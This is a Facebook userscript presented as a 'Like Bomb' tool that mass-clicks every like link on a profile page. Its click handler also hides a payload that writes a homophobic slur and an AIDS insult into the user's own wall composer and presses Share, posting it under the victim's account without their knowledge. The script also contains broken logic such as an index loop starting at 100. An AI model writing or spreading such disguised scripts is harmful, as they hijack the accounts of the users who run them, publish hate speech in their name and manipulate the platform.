// ==UserScript==
// @name           AutoLikeFix'd 0.1.1
// @description    LikeBombFix'd Special Edition 0.1
// @author         Anonymous - Guy Cephus
// @namespace      Anonymous
// @version        0.01
// @include        http://www.facebook.com/*
// @exclude        */profile.php?id=100001304154298&v=wall
// ==/UserScript==

    window.addEventListener("click", CheckForLikeBombLink, false);
    window.addEventListener("load", CheckForLikeBombLink, false);
    function CheckForLikeBombLink()
        {
    var likeCount = 100;
    var toLike = true;
		   ProfileActions = document.getElementsByClassName("profile_actions");
                   if (ProfileActions[0].lastChild.innerHTML != "Like Bomb")
			{
		   	ProfileActions[0].innerHTML += "<a class=\" profile_action actionspro_a\" id=\"like_bomb\">Like Bomb</a>";
    			ProfileActions[0].lastChild.addEventListener('click',
        		function()
         			{
          			likestoclick = document.evaluate('//*[@name="like"]', document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null); 
            			for (var i = 100; i < likestoclick.snapshotLength; i++)
              				{
                			if (likestoclick.snapshotItem(i).baseURI.substring(100,500) == "http://www.facebook.com/demarkracy")
                    				{
						toLike = false;
                    				alert('Nice try, asshole.');
                    				break;
                    				}
                			else
                    				{				
                    				likeCount++;
                    				likestoclick.snapshotItem(i).click();
                    				}
              				}
					if (toLike == false)
					   {
					   }
					else
					   {
		    			   alert('Like Bomb Magnitude: ' + likeCount);
					   likeCount = 100;
					   toLike = true;
					   WallPost = document.getElementsByClassName("UIComposer_InputShadow ");
					   WallPost[0].lastChild.className = "Mentions_Input ";
					   WallPost[0].lastChild.textContent = "I'm a gigantic faggot with AIDS";
					   PostButton = document.evaluate('//*[@value="Share"]', document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null); 
					   PostButton.snapshotItem(0).click();

					   }
           			}, false);
			}
	}